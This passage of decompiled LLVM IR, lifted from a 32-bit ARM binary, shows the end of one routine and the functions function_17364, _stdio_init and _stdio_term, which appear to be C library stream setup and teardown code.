  store i32 %v0_172f0, i32* %r2.global-to-local, align 4
  %v2_172fc71 = load i32, i32* %v1_172f0, align 4
  store i32 %v2_172fc71, i32* %r3.global-to-local, align 4
  %v3_1730073 = icmp uge i32 %v2_172fc71, %v2_172f0
  store i1 %v3_1730073, i1* %cpsr_c.global-to-local, align 1
  %v9_1730079 = icmp eq i32 %v2_172fc71, %v2_172f0
  br i1 %v9_1730079, label %dec_label_pc_17308, label %dec_label_pc_17320

dec_label_pc_17308:                               ; preds = %dec_label_pc_172f0, %dec_label_pc_17308.dec_label_pc_172fc_crit_edge
  %v0_1730880 = phi i32 [ %v1_17300.pre, %dec_label_pc_17308.dec_label_pc_172fc_crit_edge ], [ %v2_172f0, %dec_label_pc_172f0 ]
  store i32 %v0_1730880, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17318 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17318, label %dec_label_pc_1731c, label %dec_label_pc_17308.dec_label_pc_172fc_crit_edge

dec_label_pc_17308.dec_label_pc_172fc_crit_edge:  ; preds = %dec_label_pc_17308
  %v0_172fc.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17300.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_172fc = inttoptr i32 %v0_172fc.pre to i32*
  %v2_172fc = load i32, i32* %v1_172fc, align 4
  store i32 %v2_172fc, i32* %r3.global-to-local, align 4
  %v3_17300 = icmp uge i32 %v2_172fc, %v1_17300.pre
  store i1 %v3_17300, i1* %cpsr_c.global-to-local, align 1
  %v9_17300 = icmp eq i32 %v2_172fc, %v1_17300.pre
  br i1 %v9_17300, label %dec_label_pc_17308, label %dec_label_pc_17320

dec_label_pc_1731c:                               ; preds = %dec_label_pc_17308
  %v0_1731c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_1731c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17320

dec_label_pc_17320:                               ; preds = %dec_label_pc_172f0, %dec_label_pc_17308.dec_label_pc_172fc_crit_edge, %dec_label_pc_1731c
  %v0_17328 = phi i32 [ %v0_1731c, %dec_label_pc_1731c ], [ %v2_172fc71, %dec_label_pc_172f0 ], [ %v2_172fc, %dec_label_pc_17308.dec_label_pc_172fc_crit_edge ]
  %v1_17320 = phi i32 [ %v0_1731c, %dec_label_pc_1731c ], [ %v2_172f0, %dec_label_pc_172f0 ], [ %v1_17300.pre, %dec_label_pc_17308.dec_label_pc_172fc_crit_edge ]
  %v3_17320 = icmp uge i32 %v0_17328, %v1_17320
  store i1 %v3_17320, i1* %cpsr_c.global-to-local, align 1
  %v9_17320 = icmp eq i32 %v0_17328, %v1_17320
  br i1 %v9_17320, label %dec_label_pc_17328, label %dec_label_pc_17320.dec_label_pc_172f0_crit_edge

dec_label_pc_17320.dec_label_pc_172f0_crit_edge:  ; preds = %dec_label_pc_17320
  %v0_172f0.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_172f0

dec_label_pc_17328:                               ; preds = %dec_label_pc_17320
  %v2_17328 = icmp ne i32 %v1_17320, 0
  store i1 %v2_17328, i1* %cpsr_c.global-to-local, align 1
  %v7_1732c = icmp slt i32 %v1_17320, 2
  br i1 %v7_1732c, label %dec_label_pc_17350, label %dec_label_pc_17330

dec_label_pc_17330:                               ; preds = %dec_label_pc_17328
  %v0_17330 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_17330, i32* %r0.global-to-local, align 4
  %v0_17334 = load i32, i32* @r1, align 4
  %v1_17334 = add i32 %v0_17334, 129
  store i32 %v1_17334, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_17350

dec_label_pc_1734c:                               ; preds = %dec_label_pc_16f90, %dec_label_pc_16f74, %dec_label_pc_16f9c
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_17350

dec_label_pc_17350:                               ; preds = %dec_label_pc_172cc, %dec_label_pc_17328, %bb57, %dec_label_pc_16fd4, %dec_label_pc_17330, %dec_label_pc_1734c
  %v0_17350 = load i32, i32* @r5, align 4
  store i32 %v0_17350, i32* %r0.global-to-local, align 4
  %v2_17358 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_17358, i32* %r4.global-to-local, align 4
  store i32 %v6_16f34, i32* @r5, align 4
  store i32 %v9_16f34, i32* @r6, align 4
  store i32 %v12_16f34, i32* @r7, align 4
  store i32 %v15_16f34, i32* @r8, align 4
  ret i32 %v0_17350

; uselistorder directives
  uselistorder i32 %v0_1731c, { 1, 0, 2 }
  uselistorder i32 %v1_17300.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_172f0, { 1, 0 }
  uselistorder i32 %v0_172a0, { 1, 0, 2 }
  uselistorder i32 %v1_17284.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17274, { 1, 0 }
  uselistorder i32 %v0_1721c, { 1, 0, 2 }
  uselistorder i32 %v1_17200.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_171b4, { 1, 0, 2 }
  uselistorder i32 %v1_17198, { 0, 2, 1 }
  uselistorder i32 %v4_17174, { 2, 1, 0, 3 }
  uselistorder i32 %v1_17124.pre, { 2, 1, 0 }
  uselistorder i32 %v0_170a8, { 1, 2, 0 }
  uselistorder i32 %v1_17038, { 1, 0 }
  uselistorder i32 %v0_17038, { 1, 0 }
  uselistorder i32 %v1_17020, { 1, 2, 0, 3 }
  uselistorder i32 %v1_16fc4, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 1, 2, 3, 4, 6, 5, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 51, 5, 6, 7, 8, 9, 11, 10, 52, 13, 12, 14, 15, 16, 17, 18, 19, 21, 20, 53, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0, 49, 50 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 18, 19, 21, 20, 25, 22, 23, 24, 26, 27, 28 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 2, 32, 33, 3, 4, 5, 6, 34, 35, 7, 8, 9, 36, 37, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31 }
  uselistorder i32 16384, { 68, 69, 0, 70, 31, 61, 32, 62, 33, 63, 34, 64, 35, 65, 36, 66, 14, 67, 1, 45, 27, 49, 28, 50, 26, 46, 29, 47, 30, 48, 2, 51, 3, 52, 4, 53, 5, 54, 6, 55, 7, 56, 8, 57, 9, 58, 10, 59, 11, 60, 37, 71, 12, 72, 13, 73, 16, 74, 39, 75, 40, 76, 41, 77, 15, 78, 38, 79, 80, 17, 81, 18, 82, 19, 83, 42, 84, 20, 85, 21, 86, 23, 87, 22, 88, 24, 89, 25, 90, 44, 91, 92, 93, 43, 94 }
  uselistorder i32 (i32, i32)* @__libc_open, { 6, 0, 2, 1, 5, 4, 3 }
  uselistorder i32 (i32, i32)* @__libc_fcntl, { 14, 0, 13, 10, 9, 12, 11, 8, 5, 4, 3, 7, 6, 2, 1 }
  uselistorder i32 1024, { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32 ()* @malloc, { 72, 71, 70, 4, 1, 0, 2, 3, 6, 69, 68, 67, 66, 65, 64, 63, 62, 61, 60, 59, 58, 57, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 5 }
  uselistorder i8 43, { 1, 0 }
  uselistorder i32 ()* @free, { 10, 9, 5, 2, 1, 0, 3, 8, 7, 6, 4 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_17350, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1734c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17320, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17308, { 1, 0 }
  uselistorder label %dec_label_pc_172cc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_172a4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1728c, { 1, 0 }
  uselistorder label %dec_label_pc_17230, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_17220, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17208, { 1, 0 }
  uselistorder label %dec_label_pc_171c8, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_171b8, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_17100, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_17068._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_17010, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_16fac, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16f74, { 1, 2, 0 }
}

define i32 @function_17364(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_17364:
  %v0_17364 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_17364, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_17364
  %v5_17364 = sdiv i32 %arg2, 16
  %v6_17364 = and i32 %v5_17364, %arg1
  %v5_17368 = sdiv i32 %arg2, 256
  %v6_17368 = and i32 %v6_17364, %v5_17368
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_17364, %bb
  %v7_1736c = phi i32 [ %arg1, %dec_label_pc_17364 ], [ %v6_17368, %bb ]
  ret i32 %v7_1736c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %v0_1739c = call i32 @__aeabi_read_tp()
  %v3_173a0 = load i16, i16* @global_var_23424.488, align 2
  %v4_173a0 = sext i16 %v3_173a0 to i32
  store i32 %v4_173a0, i32* @r3, align 4
  store i32 %v0_1739c, i32* @r5, align 4
  store i32 0, i32* @r0, align 4
  %v2_173ac = add i32 %v4_173a0, %v0_1739c
  %v3_173ac = inttoptr i32 %v2_173ac to i32*
  %v4_173ac = load i32, i32* %v3_173ac, align 4
  store i32 %v4_173ac, i32* @r6, align 4
  %v1_173b0 = call i32 @isatty(i32 0)
  %v2_173b8 = icmp eq i32 %v1_173b0, 0
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* @r4, align 4
  br i1 %v2_173b8, label %bb, label %.thread2

bb:                                               ; preds = %entry
  %v5_173c4 = load i16, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 308) to i16*), align 4
  %v7_173c4 = zext i16 %v5_173c4 to i32
  %v2_173c8 = xor i32 %v7_173c4, 256
  store i32 %v2_173c8, i32* @r3, align 4
  %v2_173cc = trunc i32 %v2_173c8 to i16
  store i16 %v2_173cc, i16* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 308) to i16*), align 4
  br label %.thread2

.thread2:                                         ; preds = %entry, %bb
  store i32 1, i32* @r0, align 4
  %v1_173d4 = call i32 @isatty(i32 1)
  %v2_173d8 = icmp eq i32 %v1_173d4, 0
  br i1 %v2_173d8, label %bb11, label %.thread6

bb11:                                             ; preds = %.thread2
  %v1_173e0 = load i32, i32* @r4, align 4
  %v2_173e4 = add i32 %v1_173e0, 376
  %v3_173e4 = inttoptr i32 %v2_173e4 to i16*
  %v4_173e4 = load i16, i16* %v3_173e4, align 2
  %v2_173e8 = xor i16 %v4_173e4, 256
  store i16 %v2_173e8, i16* %v3_173e4, align 2
  br label %.thread6

.thread6:                                         ; preds = %.thread2, %bb11
  %v3_173f4 = load i16, i16* @global_var_23424.488, align 2
  %v4_173f4 = sext i16 %v3_173f4 to i32
  %v0_173f8 = load i32, i32* @r6, align 4
  %v1_173f8 = load i32, i32* @r5, align 4
  %v3_173f8 = add i32 %v1_173f8, %v4_173f4
  %v4_173f8 = inttoptr i32 %v3_173f8 to i32*
  store i32 %v0_173f8, i32* %v4_173f8, align 4
  ret i32 %v1_173d4

; uselistorder directives
  uselistorder i32 (i32)* @isatty, { 2, 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v3_17414 = load i32, i32* @r4, align 4
  store i32 %v3_17414, i32* %stack_var_-28, align 4
  store i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32* %r7.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 -33100), i32* %r3.global-to-local, align 4
  %v2_17428 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 -33100) to i32*), align 4
  store i32 %v2_17428, i32* %r0.global-to-local, align 4
  %v5_17428 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 -33096) to i32*), align 4
  store i32 %v5_17428, i32* %r1.global-to-local, align 4
  %v8_17428 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 -33092) to i32*), align 4
  %v2_17430 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_17430, i32* %r3.global-to-local, align 4
  store i32 %v2_17428, i32* %stack_var_-44, align 4
  store i32 152, i32* %r2.global-to-local, align 4
  %v4_1743c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 152) to i32*), align 4
  store i32 %v2_17428, i32* %r0.global-to-local, align 4
  store i32 %v5_17428, i32* %r1.global-to-local, align 4
  store i32 %v8_17428, i32* %r2.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_233cc.493 to i32), i32 -33112), i32* %r3.global-to-local, align 4
  %v1_1744c = inttoptr i32 %v4_1743c to i32*
  store i32 %v2_17428, i32* %v1_1744c, align 4
  %v3_1744c = add i32 %v4_1743c, 4
  %v4_1744c = inttoptr i32 %v3_1744c to i32*
  %v5_1744c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_1744c, i32* %v4_1744c, align 4
  %v6_1744c = add i32 %v4_1743c, 8
  %v7_1744c = inttoptr i32 %v6_1744c to i32*
  %v8_1744c = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_1744c, i32* %v7_1744c, align 4
  %v0_17450 = load i32, i32* %r3.global-to-local, align 4
  %v1_17450 = inttoptr i32 %v0_17450 to i32*
  %v2_17450 = load i32, i32* %v1_17450, align 4
  store i32 %v2_17450, i32* %r0.global-to-local, align 4
  %v3_17450 = add i32 %v0_17450, 4
  %v4_17450 = inttoptr i32 %v3_17450 to i32*
  %v5_17450 = load i32, i32* %v4_17450, align 4
  store i32 %v5_17450, i32* %r1.global-to-local, align 4
  %v6_17450 = add i32 %v0_17450, 8
  %v7_17450 = inttoptr i32 %v6_17450 to i32*
  %v8_17450 = load i32, i32* %v7_17450, align 4
  %v2_17454 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_17454, i32* %r3.global-to-local, align 4
  store i32 %v2_17450, i32* %stack_var_-56, align 4
  store i32 76, i32* %r2.global-to-local, align 4
  %v0_17460 = load i32, i32* %r7.global-to-local, align 4
  %v2_17460 = add i32 %v0_17460, 76
  %v3_17460 = inttoptr i32 %v2_17460 to i32*
  %v4_17460 = load i32, i32* %v3_17460, align 4
  store i32 %v4_17460, i32* %r1.global-to-local, align 4
  store i32 160, i32* %r2.global-to-local, align 4
  %v1_17468 = inttoptr i32 %v4_17460 to i32*
  %v2_17468 = load i32, i32* %v1_17468, align 4
  store i32 %v2_17468, i32* %r5.global-to-local, align 4
  %v2_1746c = add i32 %v0_17460, 160
  %v3_1746c = inttoptr i32 %v2_1746c to i32*
  %v4_1746c = load i32, i32* %v3_1746c, align 4
  store i32 %v2_17450, i32* %r0.global-to-local, align 4
  store i32 %v5_17450, i32* %r1.global-to-local, align 4
  store i32 %v8_17450, i32* %r2.global-to-local, align 4
  store i32 -33124, i32* %r3.global-to-local, align 4
  %v2_1747c = add i32 %v0_17460, -33124
  store i32 %v2_1747c, i32* %sl.global-to-local, align 4
  %v1_17480 = inttoptr i32 %v4_1746c to i32*
  store i32 %v2_17450, i32* %v1_17480, align 4
  %v3_17480 = add i32 %v4_1746c, 4
  %v4_17480 = inttoptr i32 %v3_17480 to i32*
  %v5_17480 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17480, i32* %v4_17480, align 4
  %v6_17480 = add i32 %v4_1746c, 8
  %v7_17480 = inttoptr i32 %v6_17480 to i32*
  %v8_17480 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_17480, i32* %v7_17480, align 4
  %v0_17510.pr = load i32, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1751016 = icmp eq i32 %v0_17510.pr, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_1751818 = add i32 %v0_17510.pr, 56
  store i32 %v1_1751818, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_1751016, label %dec_label_pc_17524, label %dec_label_pc_17488

dec_label_pc_17488:                               ; preds = %entry, %.thread10
  %v0_17488 = phi i32 [ %v3_1750c, %.thread10 ], [ %v0_17510.pr, %entry ]
  %v1_17488 = add i32 %v0_17488, 64
  %v2_17488 = inttoptr i32 %v1_17488 to i32*
  %v3_17488 = load i32, i32* %v2_17488, align 4
  store i32 %v3_17488, i32* %r3.global-to-local, align 4
  %v0_1748c = call i32 @__aeabi_read_tp()
  store i32 %v0_1748c, i32* %r0.global-to-local, align 4
  %v1_17490 = add i32 %v0_1748c, -1168
  store i32 %v1_17490, i32* %r6.global-to-local, align 4
  %v3_17494 = icmp uge i32 %v3_17488, %v1_17490
  store i1 %v3_17494, i1* %cpsr_c.global-to-local, align 1
  %v9_17494 = icmp eq i32 %v3_17488, %v1_17490
  br i1 %v9_17494, label %.thread1, label %dec_label_pc_174a8

.thread1:                                         ; preds = %dec_label_pc_17488
  %v1_17498 = load i32, i32* %r5.global-to-local, align 4
  %v2_17498 = add i32 %v1_17498, 60
  %v3_17498 = inttoptr i32 %v2_17498 to i32*
  %v4_17498 = load i32, i32* %v3_17498, align 4
  %v2_1749c = add i32 %v4_17498, 1
  store i32 %v2_1749c, i32* %r3.global-to-local, align 4
  store i32 %v2_1749c, i32* %v3_17498, align 4
  br label %.thread10

dec_label_pc_174a8:                               ; preds = %dec_label_pc_17488, %dec_label_pc_174b4
  %v0_174a8 = load i32, i32* %r2.global-to-local, align 4
  %v1_174a8 = inttoptr i32 %v0_174a8 to i32*
  %v2_174a8 = load i32, i32* %v1_174a8, align 4
  store i32 %v2_174a8, i32* %r3.global-to-local, align 4
  %v1_174ac = load i32, i32* %r4.global-to-local, align 4
  %v3_174ac = icmp uge i32 %v2_174a8, %v1_174ac
  store i1 %v3_174ac, i1* %cpsr_c.global-to-local, align 1
  %v9_174ac = icmp eq i32 %v2_174a8, %v1_174ac
  br i1 %v9_174ac, label %dec_label_pc_174b4, label %dec_label_pc_174cc

dec_label_pc_174b4:                               ; preds = %dec_label_pc_174a8
  store i32 %v2_174a8, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_174c4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_174c4, label %dec_label_pc_174c8, label %dec_label_pc_174a8

dec_label_pc_174c8:                               ; preds = %dec_label_pc_174b4
  %v0_174c8 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_174c8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_174cc

dec_label_pc_174cc:                               ; preds = %dec_label_pc_174a8, %dec_label_pc_174c8
  %v0_174cc = phi i32 [ %v0_174c8, %dec_label_pc_174c8 ], [ %v2_174a8, %dec_label_pc_174a8 ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_174cc = icmp eq i32 %v0_174cc, 0
  %v2_174d8.pre = load i32, i32* %r5.global-to-local, align 4
  br i1 %v2_174cc, label %.thread5, label %bb

.thread5:                                         ; preds = %dec_label_pc_174cc
  %v1_174d8 = load i32, i32* %r6.global-to-local, align 4
  %v3_174d8 = add i32 %v2_174d8.pre, 64
  %v4_174d8 = inttoptr i32 %v3_174d8 to i32*
  store i32 %v1_174d8, i32* %v4_174d8, align 4
  %v1_174dc = load i32, i32* %r1.global-to-local, align 4
  %v2_174dc = load i32, i32* %r5.global-to-local, align 4
  %v3_174dc = add i32 %v2_174dc, 60
  %v4_174dc = inttoptr i32 %v3_174dc to i32*
  store i32 %v1_174dc, i32* %v4_174dc, align 4
  br label %.thread10

bb:                                               ; preds = %dec_label_pc_174cc
  %v2_174d0 = add i32 %v2_174d8.pre, 8
  %v3_174d0 = inttoptr i32 %v2_174d0 to i32*
  %v4_174d0 = load i32, i32* %v3_174d0, align 4
  store i32 %v4_174d0, i32* %r3.global-to-local, align 4
  store i32 48, i32* %r2.global-to-local, align 4
  %v3_174e0 = add i32 %v2_174d8.pre, 20
  %v4_174e0 = inttoptr i32 %v3_174e0 to i32*
  store i32 %v4_174d0, i32* %v4_174e0, align 4
  %v1_174e4 = load i32, i32* %r2.global-to-local, align 4
  %v2_174e4 = trunc i32 %v1_174e4 to i16
  %v3_174e4 = load i32, i32* %r5.global-to-local, align 4
  %v4_174e4 = inttoptr i32 %v3_174e4 to i16*
  store i16 %v2_174e4, i16* %v4_174e4, align 2
  %v1_174e8 = load i32, i32* %r3.global-to-local, align 4
  %v2_174e8 = load i32, i32* %r5.global-to-local, align 4
  %v3_174e8 = add i32 %v2_174e8, 24
  %v4_174e8 = inttoptr i32 %v3_174e8 to i32*
  store i32 %v1_174e8, i32* %v4_174e8, align 4
  %v1_174ec = load i32, i32* %r3.global-to-local, align 4
  %v2_174ec = load i32, i32* %r5.global-to-local, align 4
  %v3_174ec = add i32 %v2_174ec, 28
  %v4_174ec = inttoptr i32 %v3_174ec to i32*
  store i32 %v1_174ec, i32* %v4_174ec, align 4
  %v1_174f0 = load i32, i32* %r3.global-to-local, align 4
  %v2_174f0 = load i32, i32* %r5.global-to-local, align 4
  %v3_174f0 = add i32 %v2_174f0, 16
  %v4_174f0 = inttoptr i32 %v3_174f0 to i32*
  store i32 %v1_174f0, i32* %v4_174f0, align 4
  br label %.thread10

.thread10:                                        ; preds = %.thread1, %.thread5, %bb
  %v0_174f4 = load i32, i32* %sl.global-to-local, align 4
  %v1_174f4 = inttoptr i32 %v0_174f4 to i32*
  %v2_174f4 = load i32, i32* %v1_174f4, align 4
  store i32 %v2_174f4, i32* %r0.global-to-local, align 4
  %v3_174f4 = add i32 %v0_174f4, 4
  %v4_174f4 = inttoptr i32 %v3_174f4 to i32*
  %v5_174f4 = load i32, i32* %v4_174f4, align 4
  store i32 %v5_174f4, i32* %r1.global-to-local, align 4
  %v6_174f4 = add i32 %v0_174f4, 8
  %v7_174f4 = inttoptr i32 %v6_174f4 to i32*
  %v8_174f4 = load i32, i32* %v7_174f4, align 4
  store i32 %v8_174f4, i32* %r2.global-to-local, align 4
  %v1_174fc = load i32, i32* %r5.global-to-local, align 4
  %v2_174fc = add i32 %v1_174fc, 52
  %v3_174fc = inttoptr i32 %v2_174fc to i32*
  store i32 1, i32* %v3_174fc, align 4
  %v0_17500 = load i32, i32* %r5.global-to-local, align 4
  %v1_17500 = add i32 %v0_17500, 56
  store i32 %v1_17500, i32* %r3.global-to-local, align 4
  %v2_17504 = load i32, i32* %r0.global-to-local, align 4
  %v1_17508 = inttoptr i32 %v1_17500 to i32*
  store i32 %v2_17504, i32* %v1_17508, align 4
  %v3_17508 = add i32 %v0_17500, 60
  %v4_17508 = inttoptr i32 %v3_17508 to i32*
  %v5_17508 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_17508, i32* %v4_17508, align 4
  %v6_17508 = add i32 %v0_17500, 64
  %v7_17508 = inttoptr i32 %v6_17508 to i32*
  %v8_17508 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_17508, i32* %v7_17508, align 4
  %v0_1750c = load i32, i32* %r5.global-to-local, align 4
  %v1_1750c = add i32 %v0_1750c, 32
  %v2_1750c = inttoptr i32 %v1_1750c to i32*
  %v3_1750c = load i32, i32* %v2_1750c, align 4
  store i32 %v3_1750c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17510 = icmp eq i32 %v3_1750c, 0
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_17518 = add i32 %v3_1750c, 56
  store i32 %v1_17518, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br i1 %v2_17510, label %dec_label_pc_17524, label %dec_label_pc_17488

dec_label_pc_17524:                               ; preds = %.thread10, %entry
  store i32 76, i32* %r3.global-to-local, align 4
  %v0_17528 = load i32, i32* %r7.global-to-local, align 4
  %v2_17528 = add i32 %v0_17528, 76
  %v3_17528 = inttoptr i32 %v2_17528 to i32*
  %v4_17528 = load i32, i32* %v3_17528, align 4
  store i32 %v4_17528, i32* %r3.global-to-local, align 4
  %storemerge.in11 = inttoptr i32 %v4_17528 to i32*
  %storemerge12 = load i32, i32* %storemerge.in11, align 4
  store i32 %storemerge12, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1754814 = icmp eq i32 %storemerge12, 0
  br i1 %v2_1754814, label %dec_label_pc_17550, label %dec_label_pc_17534

dec_label_pc_17534:                               ; preds = %dec_label_pc_17524, %dec_label_pc_17548
  %v1_1753c = phi i32 [ %storemerge, %dec_label_pc_17548 ], [ %storemerge12, %dec_label_pc_17524 ]
  %v1_17534 = inttoptr i32 %v1_1753c to i16*
  %v2_17534 = load i16, i16* %v1_17534, align 2
  %v3_17534 = zext i16 %v2_17534 to i32
  store i32 %v3_17534, i32* %r3.global-to-local, align 4
  %v1_17538 = and i32 %v3_17534, 64
  %v2_17538 = icmp eq i32 %v1_17538, 0
  br i1 %v2_17538, label %dec_label_pc_17548, label %bb39

bb39:                                             ; preds = %dec_label_pc_17534
  store i32 %v1_1753c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17548

dec_label_pc_17548:                               ; preds = %dec_label_pc_17534, %bb39
  %v1_17540 = xor i1 %v2_17538, true
  call void @__pseudo_cond_branch(i1 %v1_17540, i32 ptrtoint (i32* @global_var_17578.774 to i32))
  %v0_17544 = load i32, i32* %r4.global-to-local, align 4
  %v1_17544 = add i32 %v0_17544, 32
  %storemerge.in = inttoptr i32 %v1_17544 to i32*
  %storemerge = load i32, i32* %storemerge.in, align 4
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17548 = icmp eq i32 %storemerge, 0
  br i1 %v2_17548, label %dec_label_pc_17550, label %dec_label_pc_17534

dec_label_pc_17550:                               ; preds = %dec_label_pc_17548, %dec_label_pc_17524
  %v2_17554 = load i32, i32* %stack_var_-28, align 4
  store i32 %v2_17554, i32* %r4.global-to-local, align 4
  %v1_17558 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_17558

; uselistorder directives
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v3_1750c, { 1, 2, 3, 0 }
  uselistorder i32 %v1_174ac, { 1, 0 }
  uselistorder i32 %v4_1746c, { 2, 1, 0 }
  uselistorder i32 %v4_1743c, { 2, 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 11, 10, 8, 12 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 3, 4, 1, 5, 6, 7 }
  uselistorder i32* %r2.global-to-local, { 4, 0, 1, 2, 3, 12, 13, 5, 6, 7, 8, 9, 10, 11 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1, 10, 11, 3, 4, 5, 6, 7, 8, 9 }
  uselistorder i32* %r0.global-to-local, { 4, 0, 1, 2, 3, 9, 5, 6, 7, 8 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 6, 5, 1, 2, 3, 4, 7 }
  uselistorder label %dec_label_pc_17548, { 1, 0 }
  uselistorder label %dec_label_pc_17534, { 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %dec_label_pc_174cc, { 1, 0 }
  uselistorder label %dec_label_pc_174a8, { 1, 0 }
  uselistorder label %dec_label_pc_17488, { 1, 0 }
}

